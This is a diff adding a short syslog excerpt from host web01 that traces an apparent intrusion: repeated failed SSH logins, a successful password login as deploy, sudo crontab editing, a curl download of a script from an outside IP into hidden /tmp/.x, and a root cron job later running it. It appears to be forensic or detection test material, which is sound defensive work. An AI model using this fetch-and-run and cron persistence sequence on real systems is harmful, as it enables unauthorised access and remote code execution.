@@ -1,0 +1,9 @@
+Mar  4 09:58:02 web01 sshd[2211]: Failed password for invalid user admin from 203.0.113.45 port 51122 ssh2
+Mar  4 09:58:05 web01 sshd[2211]: Failed password for invalid user admin from 203.0.113.45 port 51122 ssh2
+Mar  4 09:58:09 web01 sshd[2214]: Failed password for deploy from 203.0.113.45 port 51130 ssh2
+Mar  4 10:02:41 web01 sshd[2290]: Accepted password for deploy from 203.0.113.45 port 51188 ssh2
+Mar  4 10:02:41 web01 sshd[2290]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Mar  4 10:04:13 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/crontab -e
+Mar  4 10:05:57 web01 sudo:   deploy : TTY=pts/1 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/curl -o /tmp/.x http://198.51.100.23/u.sh
+Mar  4 10:11:30 web01 sshd[2290]: pam_unix(sshd:session): session closed for user deploy
+Mar  4 11:40:00 web01 CRON[3001]: (root) CMD (/tmp/.x >/dev/null 2>&1)
